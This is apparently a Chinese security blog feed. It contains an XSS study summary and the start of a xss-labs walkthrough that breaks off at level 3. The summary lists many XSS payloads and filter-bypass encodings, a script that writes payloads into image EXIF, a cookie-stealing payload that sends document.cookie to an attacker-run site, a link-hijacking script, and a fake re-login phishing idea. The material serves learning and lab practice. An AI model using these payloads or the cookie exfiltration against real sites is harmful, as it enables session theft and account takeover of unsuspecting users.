οnerrοr&#x3D;alt&#x3D;’’+document.domain&gt;”怎么触发-CSDN博客</a></p><p>上文已经列举得很详细了，这里对几个常用标签进行详解，以方便读者理解。</p><p>注：所有具体的攻击代码都用alert()代替。</p><p><strong>一、<code>&lt;script&gt;alert()&lt;/script&gt;</code></strong></p><p>最基础的payload</p><p><strong>二、<code>οnfοcus=javascript:alert()</code></strong></p><p>onfocus事件在元素获得焦点时触发，最常与<code> &lt;input&gt;</code>、<code>&lt;select&gt; </code>和 <code>&lt;a&gt; </code>标签一起使用，以html标签<code>&lt;input&gt;</code>为例，<code>&lt;input&gt;</code>标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发，然后我们再配合javascript伪协议来执行javascript代码。</p><p>onfucus事件可以用来绕过&lt;&gt;号的过滤以达到执行js的目的，有时会οnfοcus&#x3D;javascript:alert() type&#x3D;”text”这样连着使用，以除去type&#x3D;”hidden”，把输入框（或者其他边框）显示出来，从而可以使鼠标聚焦到输入框。</p><p>οnclick&#x3D;alert()与onfocus类似</p><p><strong>三、<code>&lt;a href=javascript:alert()&gt;xxx&lt;/a&gt;</code></strong></p><p>可以插入标签（如<code>&lt;a&gt;</code>标签的href属性）达到js执行的效果，前提是闭合号&lt;””&gt;没失效。</p><p>还能利用href的隐藏属性自动Unicode解码，从而可以插入一段Unicode编码后的js伪协议，如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;a href=&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;&gt;xxx&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>其中，javascript:alert()在Unicode编码后为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure><p>不过需要注意的是，有时会对herf中传入的值进行检查，看看是否有http:&#x2F;&#x2F;，这时候需要变成</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/* http:// */</span><br></code></pre></td></tr></table></figure><p><strong>四、<code>&lt;img src=&#39;xxx&#39; οnerrοr=alert()&gt;</code></strong></p><p>src(source)是一个指向，可以大概理解跟href一样把，只是执行的内容不太一样。</p><p>onerror属性是指当图片加载不出来的时候触发js函数，以上面的代码为例，这里因为src指向的是值xxx，而不是图片的地址和base64编码啥的，就会导致触发alert函数</p><p>当然img标签还有其他姿势</p><p>当鼠标移出图片的时候执行的属性onmouseout ，如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;img src=xxx onmouseout=<span class="hljs-string">&quot;alert()&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>当鼠标移动到图片的时候执行的属性onmouseover，如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;img src=xxx onmouseover=<span class="hljs-string">&quot;alert()&quot;</span>&gt; <br></code></pre></td></tr></table></figure><p><strong>五、<code>&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;</code></strong></p><p>data一般在<code>&lt;iframe&gt;</code>标签中用来配合date:text&#x2F;html（类似于解析），有时会用</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>&lt;script&gt;alert()&lt;/script&gt;</code>进行base64编码后是<code>PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+</code>，这样就可以绕过<code>&lt;script&gt;</code>的过滤</p><p><strong>六、图片xss</strong></p><p>如果有exif xss漏洞，那我们就需要制作可以xss的图片。</p><p>exif是<strong>可交换图像文件</strong>格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录<strong>数码照片的属性信息和拍摄数据（就是图像的相关信息）</strong>。</p><p>我们可以在网上随便下载一个带有exif的图片，然后按下面步骤制作图片xss：</p><p>我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022054194.jpeg" alt="Image 15"></p><p>然后大家在各个信息上编写XSS代码即可（能写的可以都写上）。</p><p>当然可能大家想做的图片可能没有exif，相关信息根本就写不了。这里作者制作了一个脚本，可以给没有exif的图片加上exif。</p><p>（需要下载两个Python包：</p><ol><li><strong>Pillow</strong>：这是一个用于图像处理的库，支持打开、操作和保存多种格式的图像。</li><li><strong>piexif</strong>：用于处理EXIF数据的库，能方便地读取、修改和保存EXIF信息。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install Pillow piexif<br></code></pre></td></tr></table></figure><p>）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> piexif<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-comment"># 加载 JPG 图片</span><br>image_path = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please enter your image path:\n&quot;</span>)<br>img = Image.<span class="hljs-built_in">open</span>(image_path)<br><br><span class="hljs-comment"># 创建新的 EXIF 数据</span><br>exif_dict = &#123;<br>    piexif.ImageIFD.ImageDescription: <span class="hljs-string">&quot;新标题&quot;</span>,<br>    piexif.ImageIFD.Make: <span class="hljs-string">&quot;相机品牌&quot;</span>,<br>    piexif.ImageIFD.Model: <span class="hljs-string">&quot;相机型号&quot;</span>,<br>    piexif.ImageIFD.Software: <span class="hljs-string">&quot;编辑软件&quot;</span>,<br>    piexif.ImageIFD.Artist: <span class="hljs-string">&quot;作者名&quot;</span>,<br>    piexif.ImageIFD.Copyright: <span class="hljs-string">&quot;版权所有信息&quot;</span>,<br>    piexif.ImageIFD.DateTime: <span class="hljs-string">&quot;2024:10:01 12:00:00&quot;</span>,<br>&#125;<br><br><span class="hljs-comment"># 将字典转换为二进制 EXIF 数据</span><br>exif_bytes = piexif.dump(exif_dict)<br><br><span class="hljs-comment"># 保存带有 EXIF 数据的图片</span><br>img.save(<span class="hljs-string">&quot;output_image.jpg&quot;</span>, exif=exif_bytes)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EXIF 信息已成功添加！&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="混淆和绕过"><a href="#混淆和绕过" class="headerlink" title="混淆和绕过"></a>混淆和绕过</h2><h3 id="一、前端"><a href="#一、前端" class="headerlink" title="一、前端"></a>一、前端</h3><p>如果后端没有进行对前端数据的判断和处理，对前端的限制可以尝试进行抓包重发或者修改前端的HTML。比如输入框限制只能输入20个字符，这就是限制，但是前端的限制对能力强的攻击者来讲都是无用的。抓包改请求包，或者直接在前端代码中修改等。</p><h3 id="二、后端"><a href="#二、后端" class="headerlink" title="二、后端"></a>二、后端</h3><p><strong>1. 大小写绕过</strong></p><p>例如，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">scrIPt</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">scrIPt</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>2.双写绕过</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;&quot;&gt;&lt;sc&lt;script&gt;ript&gt;alert()&lt;/scr&lt;script&gt;ipt&gt; </span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;&quot;&gt;&lt;SCscriptRIPT&gt;alert()&lt;/SCRscriptIPT&gt; </span><br></code></pre></td></tr></table></figure><p><strong>3.闭合</strong></p><p>可以闭合所在标签，然后重新开始一个标签闭合</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">”&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span> &lt;”<br></code></pre></td></tr></table></figure><p><strong>4.字符代替</strong></p><p>在html中是可以将%0a和%0d作为空格使用的（回车代替空格）</p><p><strong>5.换标签</strong></p><p>根据标签的性质使用一些其他标签，或是不需要&lt;&gt;或是不在过滤范围内</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript">onclick=<span class="hljs-title function_">alert</span>()<br><br>onfocus=<span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>()<br><br>&lt;img src=# οnerrοr=<span class="hljs-string">&quot;alert(111)&quot;</span>/&gt;<br><br>&lt;object οnerrοr=alert(document.domain)&gt;<br><br>&lt;input οnfοcus=alert (document.domain)&gt;<br><br>&lt;video src=0 οnerrοr=alert(document.domain)&gt;<br><br>&lt;svg οnlοad=alert(document.domain)&gt;<br><br>iframe ，a。。等<br></code></pre></td></tr></table></figure><p><strong>6.伪协议</strong></p><p>javascript伪协议，即javascript:代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;a href=<span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;<span class="hljs-title class_">Click</span> <span class="hljs-title class_">Me</span>&lt;/a&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(2)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><br>&lt;form action=javascript:alert(3)&gt;<br><br>&lt;object data=javascript:alert(4)&gt;<br><br>&lt;button formaction=javascript;alert(5)&gt;Click Me&lt;/button&gt;<br></code></pre></td></tr></table></figure><p><strong>7.编码绕过</strong></p><p>后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器 对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的）</p><p>浏览器解析顺序是这样的，URL 解析器-&gt;HTML 解析器-&gt;CSS 解析-&gt;JS解析器</p><p>URL的解码：是在后台服务检测之前的，可以理解为后台收到URL后会自动进行解码，然后才是执行开发人员编写的对URL中的值的检测函数，首先URL编码作用不在于绕过后台检测，但是当我们是 GET方式提交数据时，而我们提交的数据中进行了实体编码，也就意味着存在&amp;，#这样的特殊字符，这时就需 要对这些特殊字符进行URL编码，这样才会保证正常解析，如果不进行URL编码的话，就会把+认为是空格了，而&amp;也会是被认为用来连接URL中参数的连接符，故需要进行URL编码。如果是以POST方式传递值，就不需要进 行URL编码了。</p><p>html实体编码（HTML解析器）：&amp;#十进制，而&amp;#x十六进制；JS编码（JS解析器）：也就是unicode编码，\u00十六进制。</p><p>利用实体编码 ：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;img src=# onerror=<span class="hljs-string">&quot;alert(&#x27;111&#x27;)&quot;</span>/&gt;<br><br>&amp;lt;img src=# onerror=<span class="hljs-string">&quot;alert(&#x27;111&#x27;)&quot;</span>/&amp;gt;<br></code></pre></td></tr></table></figure><p>利用unicode编码：</p><p>&amp;#、&amp;#x、\u 都可以用来表示一串 unicode 编码，unicode编码底层还是用二进制来存储的，显示 一般用16进制来表示。\u开头和&amp;#x开头是一样的都是16进制，只是unicode字符的不同写法，&amp;#则是unicode字符的10进制的写法。编码后</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;img src=#οnerrοr=<span class="hljs-string">&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u006a\u0061\u0064\u0065\u006e\u0027\u0029&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>实体编码要在不破坏DOM树的构成的情况下，对于有语法结构的标签名、属性名、标签名就不能进行实体编码，而对属性的值、标签之间的文本节点能够进行实体编码。</p><p>JS编码只能对位于JS解析环境内字符进行编码，且不能是括号、双引号、单引号等构成特殊意义的特殊字符，比如alert(1)中的括号就不能进行实体编码，而且在JS编码环境中不会进行实体编码解析，但有一个例外，就是在在javascript伪协议中，比如javascript:alert(‘test’);就可以实体编码。这一部分可以看成是标签a的属性href的值，从而进行实体编码会被正常解析，又可以对alert或alert中的字符进行JS编码，但对alert中的字符编码没什么实际作用。如果是输出到了js代码中，再由js代码输出到html中，那么js会先将unicode编码进行解析，然后再输出到 html中，这就有了html标签效果。</p><p><strong>8.htmlspecialchars()函数</strong></p><p>PHP里面的这个htmlspecialchars()函数把一些预定义的字符转换为 HTML 实体（文本）。比如，将可以编码的括号改成文本类型的括号。</p><p>过滤原理：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定编码单引号和双引号才能会过滤掉单引号。</p><p>预定义的字符有：</p><p>&amp; (和号)成为 &amp;</p><p>“ (双引号)成为 “</p><p>’ (单引号)成为’</p><p>&lt; (小于)成为 &lt;</p><p><strong>9.httponly</strong></p><p>HttpOnly是包含在http响应头Set-Cookie里面的一个附加的标识，所以它是后端服务器对cookie设置的一个附加的属性，在生成cookie时使用HttpOnly标志有助于减轻客户端脚本访问受保护cookie的风险。如果浏览器支持的话，大多数XSS攻击都是针对会话cookie的盗窃。后端服务器可以通过在其创建 的cookie上设置HttpOnly标志来帮助缓解此问题，这表明该cookie在客户端上不可访问。如果支持 HttpOnly的浏览器检测到包含HttpOnly标志的cookie，并且客户端脚本代码尝试读取该cookie，则浏览器将返回一个空字符串作为结果。这会通过阻止恶意代码（通常是XSS）将数据发送到攻击者的网站来使攻击失败.</p><p>如果HTTP响应标头中包含HttpOnly标志（可选），客户端脚本将无法访问cookie（如果浏览器支持该标志的话）。因此即使客户端存在跨站点脚本（XSS）漏洞，浏览器也不会将Cookie透露给第三方。 但是如果浏览器不支持HttpOnly，并且后端服务器设置了HttpOnly cookie，浏览器也会忽略HttpOnly 标志，从而创建传统的，脚本可访问的cookie。那么该cookie（通常是会话cookie）容易受到XSS攻 击。这里大家要注意一个问题，httponly不是防止xss攻击的，而是防止xss攻击代码中的js代码在浏览器上获取cookie信息。</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="一、找到xss漏洞"><a href="#一、找到xss漏洞" class="headerlink" title="一、找到xss漏洞"></a>一、找到xss漏洞</h3><p>1、凡是数据输入或者交互的地方，都有可能发生xss。所以我们需要测试的地方有：</p><p>输入框（包括搜索框、评论框等），</p><p>传递的get、post参数（可能有隐藏参数，建议抓包测试），</p><p>Referer、User-Agent、Cookie等http头传参。</p><p>我们必须认真全面的对上面各处进行仔细的测试，借以找到开发及维护人员的疏忽所在。</p><p>2、测试关键字及其过滤情况</p><p>可以套用下面payload的测试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span> </span></span><br></code></pre></td></tr></table></figure><p>其中，“’是为了测试是否有闭合的机会，而<code>sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P  &lt;sCriPt&gt; &lt;a  hReF=javascript:alert()&gt;</code>是各个payload所需的关键字，j则是unicode编码。</p><h3 id="二、利用xss漏洞"><a href="#二、利用xss漏洞" class="headerlink" title="二、利用xss漏洞"></a>二、利用xss漏洞</h3><p>1、在线XSS平台</p><p>需要一个在线XSS平台来收集cookie——&gt;</p><p>对于反射型xss可构造链接，当用户点击时，用户cookie被发送到xss平台——&gt;</p><p>窃取用户cooike之后加以利用</p><p>具体请参考：</p><p><a href="https://blog.csdn.net/vetus1/article/details/140195178" title="XSS免费接收平台以及模拟钓鱼一键生成测试_xss平台-CSDN博客">XSS免费接收平台以及模拟钓鱼一键生成测试_xss平台-CSDN博客</a>（入门）</p><p><a href="https://blog.csdn.net/2301_76631050/article/details/140646827" title="XSS-窃取Cookie及拓展_xss获取cookie并利用-CSDN博客">XSS-窃取Cookie及拓展_xss获取cookie并利用-CSDN博客</a>（进阶）</p><p>2、自建网站</p><p>如果我们自己搭建了一个网站，也可以用自己的网站去接收。</p><p>假设我们自己搭建了一个网站(<a href="http://ip/setup.php)%E5%B9%B6%E5%9C%A8%E9%87%8C%E9%9D%A2%E5%86%99%E5%A5%BD%E4%BA%86php%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B">http://ip/setup.php)并在里面写好了php，代码如下</a></p><p>（代码意思是以get类型接受一个cookie变量，并将其写入cookie.txt中）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022056249.png" alt="Image 16"></p><p>然后用户即将访问一个名叫access的网站（即<code>http://access.com</code>）,</p><p>当他访问其中某个界面要传递name参数时，若存在xss漏洞，我们可以构建payload：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">http://access.com<span class="hljs-built_in">?name</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://ip/setup.php?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>注意document.location起到跳转的作用，跳到我们搭建的网站，并且用户把自己在access网站的cookie也传递过来了，这样就达成了我们获取cookie的目的（在习题中，我们用alet()代替实际的攻击代码，所以上文所有含有alert()的所有代码在实际攻击过程中都需修改，但混淆与绕过等技术不变）</p><p>3、劫持</p><p>当然，如果真有xss漏洞，我们还可以做一个劫持，只要在下方填上我们的网站，就可以把所有a标签的链接改成我们的网站，这样用户无论点哪个链接都会跳到我们的网站，当浏览网站时点击某些链接会突然跳转到广告页面就是这个技术（不只是a标签，图片也可以，我们这里拿a标签举个例子）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">var</span> link=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementByName</span>(“a”);<br><span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>;j &lt; link.<span class="hljs-property">length</span>;j++)&#123;<br>link[j].<span class="hljs-property">herf</span>=”我们的网站”<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>利用方式会有很多，比如说，我们的网站甚至可以伪装成重新登录的页面，然后布置好跳转（这里我们模拟一下具体场景：用户鼠标一点，突然跳转，需要重新登录，然后懵懵地输入完，又返回之前的页面了），这样我们就可以获得账户密码。</p><p>上面只是举一个例子，就是说大家不要被习题困住，要有探索各种利用方法的意识（只有会攻才能会防)。</p><p>4、xss集成平台</p><p>此外我们也可以用功能更全面的xss集成平台进行利用，达到我们上面想要的效果，比如beef。</p><p>详见下文：</p><p><a href="https://blog.csdn.net/weixin_40228200/article/details/127544574" title="BEEF的简介与使用_beef怎么用-CSDN博客">BEEF的简介与使用_beef怎么用-CSDN博客</a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.anquanke.com/post/id/272641#h2-15" title="XSS跨站脚本攻击-安全客 - 安全资讯平台">XSS跨站脚本攻击-安全客 - 安全资讯平台</a></p><p><a href="https://blog.csdn.net/huangyongkang666/article/details/123624164" title="XSS（跨站攻击）-CSDN博客">XSS（跨站攻击）-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_58189050/article/details/139553470" title="XSS(跨站脚本攻击)-CSDN博客">XSS(跨站脚本攻击)-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_69043895/article/details/138005673" title="XSS-跨站脚本攻击 漏洞详解-CSDN博客">XSS-跨站脚本攻击 漏洞详解-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss-labs通关全详解</title>
    <link href="/2025/05/04/xss-labs%E9%80%9A%E5%85%B3%E5%85%A8%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/05/04/xss-labs%E9%80%9A%E5%85%B3%E5%85%A8%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142746914?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/142746914?spm=1001.2014.3001.5501</a></p></blockquote><p>我们下面进行下一个漏洞——XSS的学习，XSS是常见漏洞之一，是Web安全入门必学漏洞。为探讨清楚XSS的诸多细节，我们特以经典的xss-labs进行从入门到进阶的专项训练。</p><p>在做题过程中，作者把用到的知识进行了全面、详细、系统的总结，所以为了方便学习，查阅完全适配此文的总结是必不可少的**（怎么可以光训练不去学习、总结呢）**。</p><p>作者的总结：<a href="https://blog.csdn.net/2302_81178149/article/details/142746504" title="XSS学习总结-CSDN博客">XSS学习总结-CSDN博客</a></p><h2 id="靶场介绍及搭建"><a href="#靶场介绍及搭建" class="headerlink" title="靶场介绍及搭建"></a>靶场介绍及搭建</h2><p><strong>XSS-labs：一款以练习测试XSS思路和命令的闯关游戏，主要是以反射型XSS漏洞为主。每关弹出弹窗即视为闯关成功。</strong></p><p>靶场搭建参考下文：</p><p>[<a href="https://blog.csdn.net/qq_51577576/article/details/121862461"> 靶场环境篇 ] XSS-labs 靶场环境搭建(特别详细)_xss靶场搭建-CSDN博客</a></p><p>当然，也有一些在线xss-labs平台，不想搭建也可以去找一个用</p><h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><p>欢迎用户test？payload的长度为4？</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048340.png" alt="Image 9"></p><p>发现URL上的GET型传参，name估计就是payload攻击的点，test长度正好为4，第一关目的应该是先test一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048059.png" alt="Image 10"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048904.png" alt="Image 11"></p><p>构造payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">?name=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048729.png" alt="Image 12"></p><h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><p>这次是一个搜索框</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048007.png" alt="Image 13"></p><p>直接构造payload试试</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048540.png" alt="Image 14"></p><p>不行，看看源代码，发现<code>value=“&lt;script&gt;alert()&lt;/script&gt;”</code>，需要闭合掉引号，重新构造payload</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048821.png" alt="Image 15"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;/&gt;&lt;script&gt;alert()&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048559.png" alt="Image 16"></p><h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>直接看页面源代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022048248.png" alt="Image 17"></p><p>试试闭合单引号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;/&gt;&lt;script&gt;alert()&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p>发现不好使</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049664.png" alt="Image 18"></p><p>看页面源代码，果然符号被实体化了，但是htmlspecialchars函数只针对&lt;&gt;（即大于小于号）进行html实体化，我们还可以利用其他方法进行xss注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022049277.png" alt="Image 19"></p><p>这里我们利用<strong>onfocus事件绕过</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27; 